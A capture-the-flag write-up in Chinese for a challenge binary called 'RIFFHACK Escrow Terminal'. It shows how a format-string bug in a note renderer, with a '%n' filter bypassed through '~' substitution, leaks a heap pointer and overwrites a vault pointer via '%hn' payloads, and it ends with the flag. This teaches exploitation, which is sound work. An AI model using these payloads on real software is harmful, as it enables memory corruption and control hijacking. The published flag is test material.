# RIFFHACK Escrow Terminal

## 題目描述

A marketplace vendor is testing a native escrow-release utility for trusted deals. Review the downloadable terminal, find the unsafe note renderer, and release the payout on the remote service.

## 解題思路

### 第一步：分析功能與漏洞點

連到伺服器後，會看到以下選單：

```text
1) view pending deal
2) update buyer note
3) review buyer note
4) sync dispute cache
5) finalize escrow
6) exit
```

稍微看過功能後，就可以開始分析 binary。

其中比較重要的是 Option 2、Option 3、Option 4、Option 5，以及 `vault` 的資料結構。

---

#### Option 2：note filter

Option 2 有一個 note filter，會擋掉 format string 中的 `%n` 寫入。

還原成 C 大概如下：

```c
int validate_note(char *note) {
    for (int i = 0; note[i] != '\0'; i++) {
        if (note[i] == '%') {
            for (int j = i + 1; note[j] != '\0' && j < i + 0x12; j++) {
                if (note[j] == 'n') {
                    return 0;
                }
            }
        }
    }

    return strlen(note) < 0x60;
}
```

---

#### Option 3：unsafe note renderer

Option 3 的 review 函式最後會直接執行：

```c
printf(note, width, 0x52,
    &active_vault,
    (char *)&active_vault + 2,
    (char *)&active_vault + 4,
    ...pointers);
```

因此可以利用 format string leak heap pointer。

---

#### Option 4：sync dispute cache

Option 4 `sync dispute cache` 會對第二個 `vault` 做兩件事：

```asm
strh    w9, [x10, #0x28]    ; vaults[1].approval_latch = 0x51ff
...
add     x0, x8, #0x28       ; checksum(&vaults[1])
bl      checksum
...
strh    w0, [x8, #0x2a]     ; vaults[1].mirror_latch = checksum
```

概念上等同於：

```c
vaults[1].approval_latch = 0x51ff;
vaults[1].mirror_latch = checksum(&vaults[1]);
```

也就是說，Option 4 執行後，`vaults[1]` 就會成為可以通過 `finalize escrow` 檢查的 trusted vault。

所以目標是把 `active_vault` 導到 `vaults[1]`。

Option 4 還有第二個重點：它會把 `~` 替換成 `n`。

```asm
subs    w8, w8, #0x7e      ; '~'
b.ne    ...
mov     w8, #0x6e          ; 'n'
strb    w8, [x9]
```

寫成 C 大概如下：

```c
for (...) {
    if (note[i] == '~') {
        note[i] = 'n';
    }
}
```

這可以跟前面的 Option 2 串起來利用。

Option 2 會擋 `%n`，但 Option 4 會把 `%~` 改回 `%n`，因此可以繞過 `%n` 的限制。

---

#### Option 5：finalize escrow

Option 5 `finalize escrow` 的檢查條件可還原為：

```c
if (active_vault->approval_latch == 0x51ff &&
    active_vault->mirror_latch == checksum(active_vault)) {
    release_flag();
} else {
    puts("escrow held. active vault is not trusted.");
}
```

`checksum` 函式如下：

```asm
ldrh    w8, [x0]
ldrh    w9, [x0, #0x4]
eor     w8, w8, w9
mov     w9, #0x2a5a
eor     w8, w8, w9
```

寫成 C 大概如下：

```c
uint16_t checksum(vault_t *v) {
    return v->approval_latch ^ *(uint16_t *)((char *)v + 4) ^ 0x2a5a;
}
```

---

#### vault 結構

初始化函式中可以看到：

```asm
mov     x0, #0x2
mov     x1, #0x28
bl      _calloc
```

也就是說，程式配置了兩個大小為 `0x28` 的 `vault`：

```c
typedef struct {
    uint16_t approval_latch;    // +0x00
    uint16_t mirror_latch;      // +0x02
    uint32_t deal_id;           // +0x04
    char label[0x20];           // +0x08
} vault_t;                      // total: 0x28 bytes

vault_t *vaults = calloc(2, 0x28);
vault_t *active_vault = &vaults[0];
```

heap 佈局如下：

```text
vault_base
├── vaults[0] / primary escrow vault
└── vaults[1] / dispute escrow snapshot = vault_base + 0x28
```

---

#### active_vault

`active_vault` 是一個儲存在全域區域的 8-byte pointer。程式一開始會讓它指向第一個 `vault`：

```c
vault_t *active_vault = &vaults[0];
```

Option 5 不會固定檢查 `vaults[0]`，而是檢查：

```c
active_vault->approval_latch
active_vault->mirror_latch
```

因此，我們的目標不是直接修改 `vaults[0]` 的欄位，而是讓 `active_vault` 從 `vaults[0]` 改為指向 `vaults[1]`。

Option 4 已經會將 `vaults[1]` 設為可信任狀態：

```c
vaults[1].approval_latch = 0x51ff;
vaults[1].mirror_latch = checksum(&vaults[1]);
```

所以最終只要完成：

```c
active_vault = &vaults[1];
```

Option 5 就會把 `vaults[1]` 當成目前的 escrow vault，並通過檢查。

---

### 第二步：leak heap pointer

這一步的目標是使用 Option 2 和 Option 3，透過 format string leak heap pointer。

heap 位址會受 ASLR 影響，所以不能直接寫死 `vaults[1]` 的地址。

review function 傳入的某些 pointer 會落在下列位置：

```text
vault_base + 0x07
vault_base + 0x13
vault_base + 0x21
vault_base + 0x2d
```

因此，可以在 Option 2 塞入 format string 來 leak argument：

```text
%1$p|%2$p|%3$p|...|%8$p
```

因為 note 長度必須小於 `0x60`，所以腳本一次只 leak 8 個 slot，並掃到 `%32$p`。

接著對每個 leak 減掉已知 offset：

```python
VAULT_LEAK_OFFSETS = (0x7, 0x13, 0x21, 0x2d)

base = leaked_ptr - offset
```

如果多個 leak 都推導出相同、且以 `0x10` 對齊的 base，就能確認該位址是 `vault_base`：

```python
vault_base = recovered_base
second_vault = vault_base + 0x28
```

---

### 第三步：利用 `%hn` 改寫 active_vault

這一步的目標是利用 `%hn` 改寫 `active_vault`。

Option 3 中，`printf()` 的第 3、4、5 個 positional argument 是固定的：

```c
printf(note,
    width,
    0x52,
    &active_vault,                 // %3$
    (char *)&active_vault + 2,     // %4$
    (char *)&active_vault + 4,     // %5$
    ...);
```

這三個 argument 分別指向 `active_vault` 的不同位置：

```text
%3$ -> active_vault 的 bytes 0~1
%4$ -> active_vault 的 bytes 2~3
%5$ -> active_vault 的 bytes 4~5
```

`%hn` 會把目前 `printf()` 已輸出的字元數量，以 2-byte unsigned short 的形式寫入指定地址。

先把 `second_vault` 拆成三個 16-bit halfword：

```python
h0 = second_vault & 0xffff
h1 = (second_vault >> 16) & 0xffff
h2 = (second_vault >> 32) & 0xffff
```

接著透過三次 `%hn` 寫入：

```text
%3$hn -> 寫入 h0，覆蓋 active_vault bytes 0~1
%4$hn -> 寫入 h1，覆蓋 active_vault bytes 2~3
%5$hn -> 寫入 h2，覆蓋 active_vault bytes 4~5
```

但因為 `n` 會被擋掉，所以實際上要寫成：

```text
%3$h~
%4$h~
%5$h~
```

這樣經過 Option 2 時才不會被攔截，並且會在 Option 4 被改回：

```text
%3$hn
%4$hn
%5$hn
```

同時，Option 4 也會把 `vaults[1]` 設為 trusted vault。

最後，當 Option 3 執行 `printf(note, ...)` 時，就會觸發 `%hn` 寫入。

在本題的 heap pointer 中，最高 16 bits 原本就是 `0x0000`，因此只要覆蓋低 48 bits，就可以讓：

```c
active_vault = second_vault;
```

由於 `%hn` 寫入的是目前輸出計數，payload 要透過 `%c` 補足輸出數量。例如：

```text
%1$123c%3$hn
```

這代表先輸出 123 個字元，再把 `0x007b` 寫入第三個 argument 指向的地址。

腳本會將三個 halfword 由小到大排序，再針對差值補 padding，避免不必要的大量輸出或 16-bit wraparound。

最後流程如下：

1. Option 4 先把 `vaults[1]` 改成 trusted vault。
2. Option 3 的 format string 漏洞把 `active_vault` 指標改成 `vaults[1]`。
3. Option 5 檢查的目標變成已經合法的 `vaults[1]`。
4. 成功拿到 flag。

## 流程圖

```text
Option 2：寫入 %1$p 到 %32$p 的 leak payload
        ↓
Option 3：printf(note, ...) 印出多個 pointer
        ↓
利用 vault_base + 0x7 / 0x13 / 0x21 / 0x2d
回推出 vault_base
        ↓
計算 second_vault = vault_base + 0x28
        ↓
把 second_vault 拆成三個 16-bit halfword
        ↓
Option 2：寫入 %3$h~、%4$h~、%5$h~
並用 %c 控制各次 %hn 的寫入值
        ↓
Option 4：sync dispute cache
        ↓
vaults[1] 被設為 trusted vault
並且 ~ 被替換成 n
        ↓
payload 變成 %3$hn、%4$hn、%5$hn
        ↓
Option 3：再次觸發 printf(note, ...)
        ↓
三個 %hn 分別覆蓋 active_vault 的低 48 bits
        ↓
active_vault = second_vault
        ↓
Option 5：finalize escrow
        ↓
檢查的是已經 trusted 的 vaults[1]
        ↓
取得 flag
```

## Flag

```text
bitctf{{35cr0w_n0735_wr173_th3_ch3ck}}
```
